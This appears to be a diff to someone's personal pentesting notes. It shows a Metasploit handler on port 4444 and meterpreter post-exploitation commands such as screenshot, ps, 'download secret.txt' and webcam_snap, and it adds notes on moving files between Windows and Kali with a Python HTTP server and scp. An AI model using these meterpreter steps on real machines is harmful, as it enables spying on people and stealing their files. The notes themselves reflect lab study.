@@ -294,6 +294,8 @@ LPORT => 4444
 msf exploit(multi/handler) > run
 meterpreter > screenshot
 Screenshot saved to: /home/midhun/SPExtCdh.jpeg
+commands
+-------
 background
 ps
 download secret.txt
@@ -310,7 +312,16 @@ webcam_snap
 cd foldername
 
 
-python3 -m http.server 80
+
+
+file share from windows to kali and viceversa
+1.python3 -m http.server 8000 --bind 192.168.1.5
+
+2.Enable SSH on Kali: sudo systemctl start ssh.
+Find IP: Run ip addr or ifconfig in Kali.
+Copy from Windows (PowerShell/CMD):
+scp C:\path\to\file.txt kali@<kali_ip>:/home/kali/Desktop
+Enter the Kali password (default is usually kali). 
 
 
 
